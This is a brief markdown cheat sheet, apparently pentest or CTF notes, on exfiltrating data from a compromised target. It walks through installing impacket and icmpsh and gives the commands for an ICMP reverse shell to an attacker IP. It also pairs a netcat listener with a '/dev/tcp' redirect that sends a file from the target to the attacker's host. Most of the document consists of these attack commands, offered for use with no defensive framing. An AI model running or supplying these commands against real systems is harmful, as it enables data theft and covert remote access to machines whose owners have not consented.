# Data exfiltration

How to download data from the target machine

- ICMP
- netcat

## ICMP - Internet Control Message Protocol

**Goal:** Extract data through the ICM protocol  
**How:** Using impacket and icmpsh

ICMP is a protocol intented to be lightweight (small messages)  
Impacket helps chunk data to extract them using icmpsh  
icmpsh makes a reversal shell between target and attacker

### Tools

Install python-pip

    sudo apt install python3-pip

Install impacket

    sudo git clone https://github.com/SecureAuthCorp/impacket.git
    sudo pip3 install -r /<git cloning path>/impacket/requirements.txt
    sudo python3 /<git cloning path>/impacket/setup.py install

Install icmpsh

    sudo git clone https://github.com/bdamele/icmpsh.git
    cd icmpsh

Insert in `/etc/sysctl.conf`

    net.ipv4.icmp_echo_ignore_all=1


### Usage
#### Attacker machine

    sudo ./icmpsh_m.py <attacker-ip> <target-ip>

#### Target machine

You need to upload a icmpsh tool on the target machine first

##### Send test

    icmpsh.exe -t <attacker-ip> -r

##### Open reversal
    icmpsh.exe -t <attacker-ip>

## netcat

Open netcat listener on the attacker machine

    nc -lvnp 3333 > reset_root

On target machine shell execute the following

    cat /usr/bin/reset_root > /dev/tcp/192.168.56.107/3333